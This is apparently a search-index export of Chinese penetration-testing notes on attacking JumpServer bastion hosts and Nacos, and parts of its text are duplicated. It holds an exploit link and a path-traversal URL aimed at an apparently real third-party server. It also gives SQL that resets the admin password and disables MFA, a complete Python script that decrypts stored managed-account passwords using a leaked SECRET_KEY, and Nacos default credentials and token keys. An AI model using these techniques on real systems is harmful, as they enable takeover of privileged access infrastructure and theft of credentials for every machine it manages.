db\u6570\u636e\u5e93\u6743\u9650\uff0c\u67e5\u770b\u6258\u7ba1\u8d26\u53f7\u5bc6\u7801\u5bc6\u6587 jumpserver\u7cfb\u7edf\u6743\u9650\uff0c\u67e5\u770b\u914d\u7f6e\u6587\u4ef6\u83b7\u53d6\u52a0\u5bc6secret_key \u8d44\u4ea7\u7ba1\u7406\u2192\u8d44\u4ea7\u5217\u8868 \u53ef\u4ee5\u67e5\u770b\u5bc6\u7801 \u4f46\u662f\u770b\u5bc6\u7801\u9700\u8981\u5f00\u542fmfa\u624d\u884c\u3002 \u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u8fdb\u5165\u6570\u636e\u5e93\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u83b7\u53d6secret select * from accounts_account; \u7136\u540e\u628asecret\u548csecret_key\u653e\u5165\u5982\u4e0b\u811a\u672c\u8fd0\u884c\u5373\u53ef\u5f97\u5230\u660e\u6587\u3002 #coding:utf-8 import json import base64 from Cryptodome.Cipher import AES from Cryptodome.Util.Padding import pad from Cryptodome.Random import get_random_bytes from gmssl.sm4 import CryptSM4, SM4_ENCRYPT, SM4_DECRYPT def signer_decode(val: str): data = val.split(\".\")[1] data = data + \"=\" * (-len(data) % 4) return json.loads(base64.b64decode(data)) def process_key(key): \"\"\" \u8fd4\u56de32 bytes \u7684key \"\"\" if not isinstance(key, bytes): key = bytes(key, encoding='utf-8') if len(key) >= 32: return key[:32] return pad(key, 32) class BaseCrypto: def encrypt(self, text): return base64.urlsafe_b64encode( self._encrypt(bytes(text, encoding='utf8'))).decode('utf8') def _encrypt(self, data: bytes) -> bytes: raise NotImplementedError def decrypt(self, text): return self._decrypt( base64.urlsafe_b64decode(bytes(text, encoding='utf8'))).decode('utf8') def _decrypt(self, data: bytes) -> bytes: raise NotImplementedError class GMSM4EcbCrypto(BaseCrypto): def __init__(self, key): self.key = process_key(key) self.sm4_encryptor = CryptSM4() self.sm4_encryptor.set_key(self.key, SM4_ENCRYPT) self.sm4_decryptor = CryptSM4() self.sm4_decryptor.set_key(self.key, SM4_DECRYPT) def _encrypt(self, data: bytes) -> bytes: return self.sm4_encryptor.crypt_ecb(data) def _decrypt(self, data: bytes) -> bytes: return self.sm4_decryptor.crypt_ecb(data) class AESCrypto: \"\"\" AES \u9664\u4e86MODE_SIV\u6a21\u5f0fkey\u957f\u5ea6\u4e3a\uff1a32, 48, or 64, \u5176\u4f59key\u957f\u5ea6\u4e3a16, 24 or 32 \u8be6\u7ec6\u89c1AES\u5185\u90e8\u6587\u6863 CBC\u6a21\u5f0f\u4f20\u5165iv\u53c2\u6570 \u672c\u4f8b\u4f7f\u7528\u5e38\u7528\u7684ECB\u6a21\u5f0f \"\"\" def __init__(self, key): if len(key) > 32: key = key[:32] self.key = self.to_16(key) @staticmethod def to_16(key): \"\"\" \u8f6c\u4e3a16\u500d\u6570\u7684bytes\u6570\u636e :param key: :return: \"\"\" key = bytes(key, encoding=\"utf8\") while len(key) % 16 != 0: key += b'\\0' return key # \u8fd4\u56debytes def aes(self): return AES.new(self.key, AES.MODE_ECB) # \u521d\u59cb\u5316\u52a0\u5bc6\u5668 def encrypt(self, text): aes = self.aes() return str(base64.encodebytes(aes.encrypt(self.to_16(text))), encoding='utf8').replace('\\n', '') # \u52a0\u5bc6 def decrypt(self, text): aes = self.aes() return str( aes.decrypt(base64.decodebytes(bytes( text, encoding='utf8'))).rstrip(b'\\0').decode(\"utf8\")) # \u89e3\u5bc6 class AESCryptoGCM: \"\"\" \u4f7f\u7528AES GCM\u6a21\u5f0f \"\"\" def __init__(self, key): self.key = process_key(key) def encrypt(self, text): \"\"\" \u52a0\u5bc6text\uff0c\u5e76\u5c06 header, nonce, tag (3*16 bytes, base64\u540e\u53d8\u4e3a 3*24 bytes) \u9644\u5728\u5bc6\u6587\u524d\u3002\u89e3\u5bc6\u65f6\u8981\u7528\u5230\u3002 \"\"\" header = get_random_bytes(16) cipher = AES.new(self.key, AES.MODE_GCM) cipher.update(header) ciphertext, tag = cipher.encrypt_and_digest( bytes(text, encoding='utf-8')) result = [] for byte_data in (header, cipher.nonce, tag, ciphertext): result.append(base64.b64encode(byte_data).decode('utf-8')) return ''.join(result) def decrypt(self, text): \"\"\" \u63d0\u53d6header, nonce, tag\u5e76\u89e3\u5bc6text\u3002 \"\"\" metadata = text[:72] header = base64.b64decode(metadata[:24]) nonce = base64.b64decode(metadata[24:48]) tag = base64.b64decode(metadata[48:]) ciphertext = base64.b64decode(text[72:]) cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce) cipher.update(header) plain_text_bytes = cipher.decrypt_and_verify(ciphertext, tag) return plain_text_bytes.decode('utf-8') def get_aes_crypto(key, mode='GCM'): if mode == 'ECB': a = AESCrypto(key) elif mode == 'GCM': a = AESCryptoGCM(key) return a def get_gm_sm4_ecb_crypto(key): return GMSM4EcbCrypto(key) class Crypto: def __init__(self, cryptoes): self.cryptoes = cryptoes @property def encryptor(self): return self.cryptoes[0] def encrypt(self, text): return self.encryptor.encrypt(text) def decrypt(self, text): for decryptor in self.cryptoes: try: origin_text = decryptor.decrypt(text) if origin_text: # \u6709\u65f6\u4e0d\u540c\u7b97\u6cd5\u89e3\u5bc6\u4e0d\u62a5\u9519\uff0c\u4f46\u662f\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32 return origin_text except (TypeError, ValueError, UnicodeDecodeError, IndexError): continue if __name__ == \"__main__\": # SECRET_KEY key = 'MkMyRDRENTYtNEZGRC0wODU1LUM1OEItNjRFNTJFMzM4RkYz' # private_key \u6216 password \u5728\u6570\u636e\u5e93\u91cc\u7684\u503c data = [ 'Ktue2Otr3+hNOLUhnw3bYQ==rmIL8fQxUl0pyaxmDjN+8A==d0OpU7SFlekcuI/l8QLXBg==YgMxn/UGQzXluJBkEO9zyg==', '8z7u+nwaP/vI+JL1yzEWkw==Uw3O+MKsVmjdWfK6fbjO0w==pWJgXplH1Va1FQd5AfXA9Q==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' ] crypto = Crypto([ get_aes_crypto(key, mode='ECB'), get_aes_crypto(key, mode='GCM'), get_gm_sm4_ecb_crypto(key), ]) print('by encrypt:', crypto.encrypt('J2AT6ATXT3AL4444')) for d in data: if d.count(\".\") == 2: print('by signer:', signer_decode(d)) else: print('by crypto:', crypto.decrypt(d)) mfa\u64cd\u4f5c #\u5173\u95edmfa update users_user set mfa_level=0 where username='admin' #\u5f00\u542fmfa update users_user set mfa_level=1 where username='admin' \u67e5\u770b\u8fd0\u7ef4\u8bb0\u5f55 SELECT * FROM jumpserver.terminal_command","title":"jumpserver\u5821\u5792\u673a"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/#jumpserver","text":"","title":"jumpserver\u5821\u5792\u673a"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/#_1","text":"\u6e17\u900f rce \u672a\u6388\u6743\u8bbf\u95ee \u540e\u6e17\u900f \u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6 \u6539\u6570\u636e\u5e93\u8fdbweb \u6258\u7ba1\u673a\u5668\u7684\u8d26\u6237\u5bc6\u7801\u83b7\u53d6 mfa\u64cd\u4f5c \u67e5\u770b\u8fd0\u7ef4\u8bb0\u5f55 \u5f00\u6e90\u5821\u5792\u673a","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/#_2","text":"","title":"\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/#rce","text":"JumpServer < v2.6.2 JumpServer < v2.5.4 JumpServer < v2.4.5 JumpServer = v1.5.9 https://github.com/Veraxy00/Jumpserver-EXP","title":"rce"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/#_3","text":"3.0.0 <= JumpServer <= 3.6.3 \u76ee\u524d\u5404\u5927CERT\u7ed9\u51fa\u7684payload\u662f /api/v1/terminal/sessions/ \u6216/api/v1/terminal/sessions/?limit=1\u6216 /api/v1/terminal/sessions.json?limit=1 \u7136\u540e\u5c31\u53ef\u4ee5\u4e0b\u8f7d\u89c6\u9891\u6587\u4ef6\uff08\u4e0d\u786e\u5b9a\u8be5payload\u662f\u5426\u6709\u6548\uff09 http://soho1.physis.com.cn:8600/media/xpack/../replay/2023-09-21/a7cf55c5-8d72-49e7-943c-486fed057047.cast.gz","title":"\u672a\u6388\u6743\u8bbf\u95ee"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/#_4","text":"","title":"\u540e\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/#_5","text":"https://docs.jumpserver.org/zh/master/admin-guide/env/ \u914d\u7f6e\u6587\u4ef6\u53c2\u6570\u5217\u8868 vi /opt/jumpserver/config/config.txt","title":"\u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/#web","text":"hash\u65e0\u6cd5\u89e3\u5bc6\uff0c\u56e0\u4e3a\u88ab\u591a\u6b21hash #\u67e5\u770b\u7528\u6237\u8868 selelct * from users_user; #\u5907\u4efd\u539f\u59cb\u5bc6\u7801 select password from users_user where username='admin' #\u66ff\u6362\u5bc6\u6587\u4e3ayyds@1234 update users_user set password='pbkdf2_sha256$260000$OcZu99PdSdBwb7cqNHB778$kg8kDAcG24M0baJat3O/uX1IxTFWXtJGfbalY+7Pj84=' where username='admin' \u5982\u679c\u5f00\u542f\u4e86mfa\u4e8c\u6b21\u8ba4\u8bc1\uff0c\u5219\u9700\u8981\u7ed5\u8fc7\uff0c\u540e\u6587\u4f1a\u8c08\u53ca","title":"\u6539\u6570\u636e\u5e93\u8fdbweb"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/#_6","text":"\u524d\u63d0\u9700\u8981 db\u6570\u636e\u5e93\u6743\u9650\uff0c\u67e5\u770b\u6258\u7ba1\u8d26\u53f7\u5bc6\u7801\u5bc6\u6587 jumpserver\u7cfb\u7edf\u6743\u9650\uff0c\u67e5\u770b\u914d\u7f6e\u6587\u4ef6\u83b7\u53d6\u52a0\u5bc6secret_key \u8d44\u4ea7\u7ba1\u7406\u2192\u8d44\u4ea7\u5217\u8868 \u53ef\u4ee5\u67e5\u770b\u5bc6\u7801 \u4f46\u662f\u770b\u5bc6\u7801\u9700\u8981\u5f00\u542fmfa\u624d\u884c\u3002 \u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u8fdb\u5165\u6570\u636e\u5e93\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u83b7\u53d6secret select * from accounts_account; \u7136\u540e\u628asecret\u548csecret_key\u653e\u5165\u5982\u4e0b\u811a\u672c\u8fd0\u884c\u5373\u53ef\u5f97\u5230\u660e\u6587\u3002 #coding:utf-8 import json import base64 from Cryptodome.Cipher import AES from Cryptodome.Util.Padding import pad from Cryptodome.Random import get_random_bytes from gmssl.sm4 import CryptSM4, SM4_ENCRYPT, SM4_DECRYPT def signer_decode(val: str): data = val.split(\".\")[1] data = data + \"=\" * (-len(data) % 4) return json.loads(base64.b64decode(data)) def process_key(key): \"\"\" \u8fd4\u56de32 bytes \u7684key \"\"\" if not isinstance(key, bytes): key = bytes(key, encoding='utf-8') if len(key) >= 32: return key[:32] return pad(key, 32) class BaseCrypto: def encrypt(self, text): return base64.urlsafe_b64encode( self._encrypt(bytes(text, encoding='utf8'))).decode('utf8') def _encrypt(self, data: bytes) -> bytes: raise NotImplementedError def decrypt(self, text): return self._decrypt( base64.urlsafe_b64decode(bytes(text, encoding='utf8'))).decode('utf8') def _decrypt(self, data: bytes) -> bytes: raise NotImplementedError class GMSM4EcbCrypto(BaseCrypto): def __init__(self, key): self.key = process_key(key) self.sm4_encryptor = CryptSM4() self.sm4_encryptor.set_key(self.key, SM4_ENCRYPT) self.sm4_decryptor = CryptSM4() self.sm4_decryptor.set_key(self.key, SM4_DECRYPT) def _encrypt(self, data: bytes) -> bytes: return self.sm4_encryptor.crypt_ecb(data) def _decrypt(self, data: bytes) -> bytes: return self.sm4_decryptor.crypt_ecb(data) class AESCrypto: \"\"\" AES \u9664\u4e86MODE_SIV\u6a21\u5f0fkey\u957f\u5ea6\u4e3a\uff1a32, 48, or 64, \u5176\u4f59key\u957f\u5ea6\u4e3a16, 24 or 32 \u8be6\u7ec6\u89c1AES\u5185\u90e8\u6587\u6863 CBC\u6a21\u5f0f\u4f20\u5165iv\u53c2\u6570 \u672c\u4f8b\u4f7f\u7528\u5e38\u7528\u7684ECB\u6a21\u5f0f \"\"\" def __init__(self, key): if len(key) > 32: key = key[:32] self.key = self.to_16(key) @staticmethod def to_16(key): \"\"\" \u8f6c\u4e3a16\u500d\u6570\u7684bytes\u6570\u636e :param key: :return: \"\"\" key = bytes(key, encoding=\"utf8\") while len(key) % 16 != 0: key += b'\\0' return key # \u8fd4\u56debytes def aes(self): return AES.new(self.key, AES.MODE_ECB) # \u521d\u59cb\u5316\u52a0\u5bc6\u5668 def encrypt(self, text): aes = self.aes() return str(base64.encodebytes(aes.encrypt(self.to_16(text))), encoding='utf8').replace('\\n', '') # \u52a0\u5bc6 def decrypt(self, text): aes = self.aes() return str( aes.decrypt(base64.decodebytes(bytes( text, encoding='utf8'))).rstrip(b'\\0').decode(\"utf8\")) # \u89e3\u5bc6 class AESCryptoGCM: \"\"\" \u4f7f\u7528AES GCM\u6a21\u5f0f \"\"\" def __init__(self, key): self.key = process_key(key) def encrypt(self, text): \"\"\" \u52a0\u5bc6text\uff0c\u5e76\u5c06 header, nonce, tag (3*16 bytes, base64\u540e\u53d8\u4e3a 3*24 bytes) \u9644\u5728\u5bc6\u6587\u524d\u3002\u89e3\u5bc6\u65f6\u8981\u7528\u5230\u3002 \"\"\" header = get_random_bytes(16) cipher = AES.new(self.key, AES.MODE_GCM) cipher.update(header) ciphertext, tag = cipher.encrypt_and_digest( bytes(text, encoding='utf-8')) result = [] for byte_data in (header, cipher.nonce, tag, ciphertext): result.append(base64.b64encode(byte_data).decode('utf-8')) return ''.join(result) def decrypt(self, text): \"\"\" \u63d0\u53d6header, nonce, tag\u5e76\u89e3\u5bc6text\u3002 \"\"\" metadata = text[:72] header = base64.b64decode(metadata[:24]) nonce = base64.b64decode(metadata[24:48]) tag = base64.b64decode(metadata[48:]) ciphertext = base64.b64decode(text[72:]) cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce) cipher.update(header) plain_text_bytes = cipher.decrypt_and_verify(ciphertext, tag) return plain_text_bytes.decode('utf-8') def get_aes_crypto(key, mode='GCM'): if mode == 'ECB': a = AESCrypto(key) elif mode == 'GCM': a = AESCryptoGCM(key) return a def get_gm_sm4_ecb_crypto(key): return GMSM4EcbCrypto(key) class Crypto: def __init__(self, cryptoes): self.cryptoes = cryptoes @property def encryptor(self): return self.cryptoes[0] def encrypt(self, text): return self.encryptor.encrypt(text) def decrypt(self, text): for decryptor in self.cryptoes: try: origin_text = decryptor.decrypt(text) if origin_text: # \u6709\u65f6\u4e0d\u540c\u7b97\u6cd5\u89e3\u5bc6\u4e0d\u62a5\u9519\uff0c\u4f46\u662f\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32 return origin_text except (TypeError, ValueError, UnicodeDecodeError, IndexError): continue if __name__ == \"__main__\": # SECRET_KEY key = 'MkMyRDRENTYtNEZGRC0wODU1LUM1OEItNjRFNTJFMzM4RkYz' # private_key \u6216 password \u5728\u6570\u636e\u5e93\u91cc\u7684\u503c data = [ 'Ktue2Otr3+hNOLUhnw3bYQ==rmIL8fQxUl0pyaxmDjN+8A==d0OpU7SFlekcuI/l8QLXBg==YgMxn/UGQzXluJBkEO9zyg==', '8z7u+nwaP/vI+JL1yzEWkw==Uw3O+MKsVmjdWfK6fbjO0w==pWJgXplH1Va1FQd5AfXA9Q==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' ] crypto = Crypto([ get_aes_crypto(key, mode='ECB'), get_aes_crypto(key, mode='GCM'), get_gm_sm4_ecb_crypto(key), ]) print('by encrypt:', crypto.encrypt('J2AT6ATXT3AL4444')) for d in data: if d.count(\".\") == 2: print('by signer:', signer_decode(d)) else: print('by crypto:', crypto.decrypt(d))","title":"\u6258\u7ba1\u673a\u5668\u7684\u8d26\u6237\u5bc6\u7801\u83b7\u53d6"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/#mfa","text":"#\u5173\u95edmfa update users_user set mfa_level=0 where username='admin' #\u5f00\u542fmfa update users_user set mfa_level=1 where username='admin'","title":"mfa\u64cd\u4f5c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/#_7","text":"SELECT * FROM jumpserver.terminal_command","title":"\u67e5\u770b\u8fd0\u7ef4\u8bb0\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/nacos/nacos/","text":"nacos \u76ee\u5f55 \u6e17\u900f \u9ed8\u8ba4\u5bc6\u7801 Nacos-Sync\u672a\u6388\u6743\u6f0f\u6d1e \u9ed8\u8ba4token hessian rce \u91cc\u9762\u6709\u5f88\u591a\u914d\u7f6e\u6587\u4ef6\uff0c\u62ff\u5230\u4e86\u6709\u5927\u4f5c\u7528 \u6e17\u900f \u9ed8\u8ba4\u5bc6\u7801 nacos nacos Nacos-Sync\u672a\u6388\u6743\u6f0f\u6d1e https://xxx.xxx.xxx/#/serviceSync \u9ed8\u8ba4token The default token(Base64 String): nacos.core.auth.default.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789 2.1.0 \u7248\u672c\u540e nacos.core.auth.plugin.nacos.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789 Nacos \u5e73\u53f0\u5728\u9ed8\u8ba4\u914d\u7f6e\u4e0b\u672a\u5bf9 token.secret.key \u8fdb\u884c\u4fee\u6539\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6f0f\u6d1e\u53ef\u4ee5\u83b7\u53d6\u670d\u52a1\u5668\u6570\u636e\u5e93/OSS\u7b49\u6743\u9650\u3002 